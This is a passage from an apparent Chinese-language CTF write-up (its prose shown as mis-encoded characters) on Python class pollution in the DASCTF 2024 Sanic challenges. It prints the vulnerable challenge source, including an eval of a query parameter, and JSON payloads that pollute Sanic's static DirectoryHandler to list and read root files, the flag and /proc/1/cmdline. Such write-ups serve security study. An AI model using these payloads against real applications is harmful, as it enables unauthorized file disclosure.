</span></span><span class="line"><span class="cl">            <span class="n">directory_handler</span> <span class="o">=</span> <span class="n">DirectoryHandler</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">uri</span><span class="o">=</span><span class="n">uri</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">directory</span><span class="o">=</span><span class="n">file_or_directory</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">directory_view</span><span class="o">=</span><span class="n">directory_view</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">index</span><span class="o">=</span><span class="n">index</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›DirectoryHandlerè¿™ä¸ªç±»</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DirectoryHandler</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Serve files from a directory.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    Args:
</span></span></span><span class="line"><span class="cl"><span class="s2">        uri (str): The URI to serve the files at.
</span></span></span><span class="line"><span class="cl"><span class="s2">        directory (Path): The directory to serve files from.
</span></span></span><span class="line"><span class="cl"><span class="s2">        directory_view (bool): Whether to show a directory listing or not.
</span></span></span><span class="line"><span class="cl"><span class="s2">        index (Optional[Union[str, Sequence[str]]]): The index file(s) to
</span></span></span><span class="line"><span class="cl"><span class="s2">            serve if the directory is requested. Defaults to None.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">uri</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">directory</span><span class="p">:</span> <span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">directory_view</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">index</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Sequence</span><span class="p">[</span><span class="nb">str</span><span class="p">]]]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">index</span> <span class="o">=</span> <span class="p">[</span><span class="n">index</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">index</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">index</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">base</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">directory</span> <span class="o">=</span> <span class="n">directory</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">directory_view</span> <span class="o">=</span> <span class="n">directory_view</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">index</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬åªéœ€è¦æŠŠdirectoryæ±¡æŸ“æˆæ ¹ç›®å½•ï¼Œdirectory_viewæ±¡æŸ“æˆTrueå°±èƒ½çœ‹åˆ°æ ¹ç›®å½•æ–‡ä»¶äº†</p>
<p>æœ¬åœ°èµ·ä¸€ä¸ªè°ƒè¯•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic</span> <span class="kn">import</span> <span class="n">Sanic</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic.response</span> <span class="kn">import</span> <span class="n">text</span><span class="p">,</span> <span class="n">html</span>
</span></span><span class="line"><span class="cl"><span class="c1">#from sanic_session import Session</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pydash</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pydash==5.1.2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pollute</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">static</span><span class="p">(</span><span class="s2">&#34;/static/&#34;</span><span class="p">,</span> <span class="s2">&#34;./static/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Session(app)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</span>
</span></span><span class="line"><span class="cl"><span class="c1">#async def index(request):</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#return html(open(&#39;static/index.html&#39;).read())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#@app.route(&#34;/login&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#async def login(request):</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#user = request.cookies.get(&#34;user&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#if user.lower() == &#39;adm;n&#39;:</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#request.ctx.session[&#39;admin&#39;] = True</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#return text(&#34;login success&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#return text(&#34;login fail&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/src&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">src</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">eval</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;gxngxngxn&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/admin&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">admin</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span> <span class="ow">and</span> <span class="n">value</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="ow">and</span> <span class="s1">&#39;_.&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pollute</span> <span class="o">=</span> <span class="n">Pollute</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">(</span><span class="n">pollute</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;forbidden&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#print(app.router.name_index[&#39;name&#39;].directory_view)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»è¿‡æŸ¥è¯¢èµ„æ–™å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªæ¡†æ¶å¯ä»¥é€šè¿‡**app.router.name_index[&lsquo;xxxxx&rsquo;]**æ¥è·å–æ³¨å†Œçš„è·¯ç”±ï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å°çœ‹çœ‹</p>
<p>å›æ˜¾è·¯ç”±<code>&quot;__mp_main__.static&quot;</code></p>
<p>æ¥ä¸‹æ¥æ€ä¹ˆè°ƒç”¨åˆ°<code>DirectoryHandler</code>é‡Œå‘¢? æˆ‘ä»¬å¯ä»¥å…¨å±€æœç´¢ä¸‹<code>name_index</code>è¿™ä¸ªæ–¹æ³•</p>
<p>åŠ¨è°ƒå¯ä»¥å‘ç°å¯ä»¥ä»handlerå…¥æ‰‹ï¼Œä¸€ç›´å¯ä»¥è·å–åˆ°DirectoryHandlerä¸­çš„directoryå’Œdirectory_view</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&#34;,&#34;value&#34;: true}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨æ„è¿™é‡Œä¸èƒ½ç”¨[]æ¥åŒ…è£¹å…¶ä¸­çš„ç´¢å¼•ï¼Œæ±¡æŸ“å’Œç›´æ¥è°ƒç”¨ä¸åŒï¼Œæˆ‘ä»¬éœ€è¦ç”¨.æ¥è¿æ¥ï¼Œè€Œ<code>__mp_main.static</code>æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä¸èƒ½åˆ†å¼€ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸¤ä¸ªåæ–œæ æ¥è½¬ä¹‰å°±å¤Ÿäº†,å¯ä»¥çœ‹åˆ°æ˜¯æ±¡æŸ“æˆåŠŸäº†ï¼Œè®¿é—®/static/ï¼Œå¯ä»¥çœ‹åˆ°è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ±¡æŸ“directory,å¦‚æœç›´æ¥æ±¡æŸ“ä¼š500ï¼Œä¸èƒ½ç›´æ¥æ±¡æŸ“æˆå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°å®ƒæ˜¯ä»€ä¹ˆç±»å‹çš„</p>
<p>è·Ÿè¿›å‰ä¸‹<code>DirectoryHandler</code>ç±»ä¸‹é¢çš„path</p>
<p>å¯ä»¥çœ‹åˆ°partsçš„å€¼æœ€åæ˜¯ç»™äº†_partsè¿™ä¸ªå±æ€§ï¼Œæˆ‘ä»¬è®¿é—®è¿™ä¸ªå±æ€§è¿”å›ä¸€ä¸ªåˆ—è¡¨</p>
<p>é‚£ä¹ˆä¸Šé¢çš„æ±¡æŸ“ç›´æ¥æ±¡æŸ“æˆåˆ—è¡¨å°±è¡Œäº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&#34;,&#34;value&#34;: [&#34;/&#34;]}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å†è®¿é—®staticç›®å½•å°±èƒ½çœ‹åˆ°flagåäº†</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328231419772.png"
	width="1374"
	height="880"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328231419772_hu11988532794304519502.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328231419772_hu2484384366744870379.png 1024w"
	loading="lazy"
	
		alt="image-20250328231419772"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="374px"
	
></p>
<p>ç”¨ä¸Šé¢æ–¹æ³•æ±¡æŸ“è¯»flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;.__init__\\\\.__globals__\\\\.__file__&#34;,&#34;value&#34;: &#34;/24bcbd0192e591d6ded1_flag&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="dasctf-2024æš‘æœŸæŒ‘æˆ˜èµ›ä¸ºçƒ­çˆ±å¹¶è‚©ä½œæˆ˜sanics-revenge">[DASCTF 2024æš‘æœŸæŒ‘æˆ˜èµ›ï½œä¸ºçƒ­çˆ±ï¼Œå¹¶è‚©ä½œæˆ˜]Sanic&rsquo;s revenge
</h3><p>ä¸Šé¢è·Ÿç€gxngxngxnå¸ˆå‚…çš„åšå®¢æ‰“çš„ï¼Œä»–å‘ç°ä¸‹é¢è¿™ä¸ª<code>file_or_directory</code>å¯ä»¥æ±¡æŸ“ï¼Œåƒflaskä¸­çš„**_static_url_path**,æ±¡æŸ“äº†ä»¥åå¯ä»¥é€šè¿‡è·¯ç”±ç›´æ¥è®¿é—®åˆ°æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&#34;,&#34;value&#34;: &#34;/&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…ˆç”¨polluteè·¯ç”±æ±¡æŸ“</p>
<p>è¯»<code>/static/proc/1/cmdline</code></p>
<p>çœ‹åˆ°start.sh</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328233322716.png"
	width="1693"
	height="635"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328233322716_hu6311031930619990102.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328233322716_hu14498926232631167562.png 1024w"
	loading="lazy"
	
		alt="image-20250328233322716"
	
	
		class="gallery-image" 
		data-flex-grow="266"
		data-flex-basis="639px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic</span> <span class="kn">import</span> <span class="n">Sanic</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic.response</span> <span class="kn">import</span> <span class="n">text</span><span class="p">,</span> <span class="n">html</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pydash</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pydash==5.1.2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#æºç å¥½åƒè¢«adminåˆ æ‰äº†ä¸€äº›ï¼Œå¬ä»–è¯´é‡Œé¢è—æœ‰å¤§ç§˜å¯†</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pollute</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_log_dir</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">num</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">letter</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span> <span class="mi">122</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">Letter</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">65</span><span class="p">,</span> <span class="mi">90</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="n">num</span><span class="p">,</span> <span class="n">letter</span><span class="p">,</span> <span class="n">Letter</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">+=</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">static</span><span class="p">(</span><span class="s2">&#34;/static/&#34;</span><span class="p">,</span> <span class="s2">&#34;./static/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/Wa58a1qEQ59857qQRPPQ&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">secret</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/h111int&#34;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">       <span class="n">hint</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="n">hint</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">html</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;static/index.html&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/adminLook&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">AdminLook</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#æ–¹ä¾¿ç®¡ç†å‘˜æŸ¥çœ‹éæ³•æ—¥å¿—</span>
</span></span><span class="line"><span class="cl">    <span class="n">log_dir</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls /tmp -al&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="n">log_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/pollute&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">POLLUTE</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span> <span class="ow">and</span> <span class="n">value</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="ow">and</span> <span class="s1">&#39;parts&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">key</span> <span class="ow">and</span> <span class="s1">&#39;proc&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="nb">list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pollute</span> <span class="o">=</span> <span class="n">Pollute</span><span class="p">()</span>
